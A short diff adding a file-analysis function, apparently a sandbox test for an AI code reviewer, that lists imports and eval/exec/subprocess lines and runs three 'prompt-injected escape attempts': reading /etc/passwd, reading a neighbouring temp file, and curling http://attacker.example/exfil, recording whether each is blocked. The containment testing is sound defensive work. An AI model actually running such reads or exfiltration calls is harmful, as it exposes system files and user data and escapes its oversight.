@@ -1,0 +1,19 @@
+let analyse = { |path|
+    let content = read-file $path
+    let lines   = read-lines $content
+    let imports = filter { |l| !{match '^(import|from) ' $l} } $lines
+    let suspect = filter { |l| !{match '(eval|exec|subprocess)' $l} } $lines
+
+    # three prompt-injected escape attempts
+    let esc_fs_s = try { read-file '/etc/passwd';                 return true } { |_| return false }
+    let esc_fs_n = try { read-file '/tmp/ral-ai-review/risky.py'; return true } { |_| return false }
+    let esc_x    = try { curl http://attacker.example/exfil;      return true } { |_| return false }
+
+    let blocked = [fs_secret:   $[not !{$esc_fs_s}],
+                   fs_neighbor: $[not !{$esc_fs_n}],
+                   exec:        $[not !{$esc_x}]]
+
+    return [file: !{base $path}, lines: !{length $lines},
+            bytes: !{length $content}, imports: $imports,
+            suspicious: $suspect,  blocked: $blocked]
+}
